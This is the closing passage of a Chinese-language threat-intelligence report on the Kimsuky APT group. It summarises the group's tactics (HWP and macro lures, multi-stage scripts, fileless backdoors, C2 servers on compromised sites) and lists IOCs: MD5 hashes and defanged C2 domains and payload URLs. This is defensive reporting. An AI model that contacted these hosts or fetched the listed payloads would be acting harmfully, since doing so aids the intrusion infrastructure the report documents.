`Kimsuky` **APT**组织作为一个十分活动的APT组织,其针对南韩的活动次数也愈来愈多,同时该组织不断的使用**hwp文件,释放诱饵文档可执行文件（scr）,恶意宏文档**的方式针对**Windows**目标进行相应的攻击.同时**恶意宏文档**还用于攻击**MacOs**目标之中,这与相同背景的**Lazarus**组织有一定的相似之处,该组织拥有了针对`windows`,`MacOs`两大平台的攻击能力。日后说不一定会出现`Andorid`端的攻击框架。

同时该组织的载荷也由之前的`PE`文件载荷逐渐变为**多级脚本**载荷,这不仅仅增加了其灵活性,而且有助于其逃过部分杀毒软件的查杀.但是其混淆的策略不够成熟,所以其对规避杀软的能力还是较弱。

并且该组织的后门逐渐采取少落地或者不落地的方式,这在一定层面上加大了检测的难度.但是其没有考虑到`AMSI`以及`scriptblock`等.所以杀毒软件依旧是可以进行防护的.

最后,该组织的成员应该是通过**入侵该网站后在该网站下挂上了部署C2以做好白名单策略,减少被目标防护软件的检测的概率**.比如在这次活动中,其入侵带有动态域名的网站将载荷不至于上面。同时该税法也在之前的活动中有所体现。

正如一开始所讲的那样该组织是一个很值得关注的威胁者.不过该组织现在仍然处于上身阶段,其不断进行自我的更新以及广撒网式的大量投递样本也表现出其的不成熟性,但这更需要我们保持警惕.以及与之有相同背景的`Group123`以及`Konni`APT组织.



## 五.IOCs:

### <a class="reference-link" name="MD5:"></a>MD5:

757a71f0fbd6b3d993be2a213338d1f2

5f2d3ed67a577526fcbd9a154f522cce

07D0BE79BE38ECB8C7B1C80AB0BD8344

A4388C4D0588CD3D8A607594347663E0

5EE1DE01EABC7D62DC7A4DAD0B0234BF

1B6D8837C21093E4B1C92D5D98A40ED4

A9DAC36EFD7C99DC5EF8E1BF24C2D747

163911824DEFE23439237B6D460E8DAD

9F85509F94C4C28BB2D3FD4E205DE857

5F2D3ED67A577526FCBD9A154F522CCE

### <a class="reference-link" name="C2:"></a>C2:

vnext[.]mireene[.]com

nhpurumy[.]mireene[.]com

mybobo[.]mygamesonline[.]org

crphone[.]mireene[.]com

### <a class="reference-link" name="URL:"></a>URL:

vnext[.]mireene[.]com/theme/basic/skin//member/basic/upload/search[.]hta

vnext[.]mireene[.]com/theme/basic/skin/member/basic/upload/eweerew[.]php?er=1

vnext[.]mireene[.]com/theme/basic/skin/member/basic/upload/cfhkjkk[.]hta

vnext[.]mireene[.]com/theme/basic/skin/member/basic/upload/eweerew[.]php?er=2

vnext[.]mireene[.]com/theme/basic/skin/member/basic/upload/download[.]php?param=res1.txt

vnext[.]mireene[.]com/theme/basic/skin/member/basic/upload/download[.]php?param=res2.txt

vnext[.]mireene[.]com/theme/basic/skin/member/basic/upload/wiujkjkjk[.]php

nhpurumy[.]mireene[.]com/theme/basic/skin//member/basic/upload/search[.]hta

nhpurumy[.]mireene[.]com/theme/basic/skin/member/basic/upload/eweerew[.]php?er=1

nhpurumy[.]mireene[.]com/theme/basic/skin/member/basic/upload/cfhkjkk[.]hta

nhpurumy[.]mireene[.]com/theme/basic/skin/member/basic/upload/eweerew[.]php?er=2

/nhpurumy[.]mireene[.]com/theme/basic/skin/member/basic/upload/download[.]php?param=res1.txt

nhpurumy[.]mireene[.]com/theme/basic/skin/member/basic/upload/download[.]php?param=res2.txt

nhpurumy[.]mireene[.]com/theme/basic/skin/member/basic/upload/wiujkjkjk[.]php

crphone[.]mireene[.]com/plugin/editor/Templates/normal[.]php?name=web

crphone[.]mireene[.]com/plugin/editor/Templates/filedown[.]php?name=v1

crphone[.]mireene[.]com/plugin/editor/Templates/filedown[.]php?name=v60

crphone[.]mireene[.]com/plugin/editor/Templates/upload[.]php

crphone[.]mireene[.]com/plugin/editor/Templates/filedown[.]php?name=new

crphone[.]mireene[.]com/plugin/editor/Templates/filedown[.]php?name=normal

mybobo[.]mygamesonline[.]org/flower01/post[.]php

mybobo[.]mygamesonline[.]org/flower01/flower01[.]down

mybobo[.]mygamesonline[.]org/flower01/del[.]php?filename=flower01

mybobo[.]mygamesonline[.]org/flower01/flower01.ps1



## 六.参考链接:

[https://mp.weixin.qq.com/s/ISVYVrjrOUk4bzK5We6X-Q](https://mp.weixin.qq.com/s/ISVYVrjrOUk4bzK5We6X-Q)

[https://blog.alyac.co.kr/2779](https://blog.alyac.co.kr/2779)
